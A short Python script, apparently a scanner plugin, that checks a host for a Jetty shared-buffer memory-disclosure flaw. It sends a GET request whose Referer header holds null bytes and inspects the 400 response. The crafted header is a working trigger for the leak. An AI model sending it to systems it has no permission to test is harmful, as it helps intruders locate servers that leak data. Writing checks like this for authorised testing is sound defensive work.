# -*- coding:utf-8 -*-

import socket

def verify(protocol,ip,port):
    url = protocol+'://'+ip+':'+str(port)
    timeout = 3
    print('testing if jetty Shared cache area remote reveal vul')
    try:
        socket.setdefaulttimeout(timeout)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, int(port)))
        flag = "GET / HTTP/1.1\r\nReferer:%s\r\n\r\n" % (chr(0) * 15)
        flag = flag.encode('utf-8')
        s.send(flag)
        data = s.recv(512)
        s.close()
        if b'state=HEADER_VALUE' in data and b'400' in data:
            msg = 'There is jetty Shared cache area remote reveal vul on url: ' +url+ ' .'
            number = 'v25'
            print(msg)
            return True,url,number,msg
        else:
            msg = 'There is no jetty Shared cache area remote reveal vul'
            number = 'v0'
            return False,url,number,msg
    except Exception as e:
        msg = str(e)
        number = 'v0'
        return False,url,number,msg
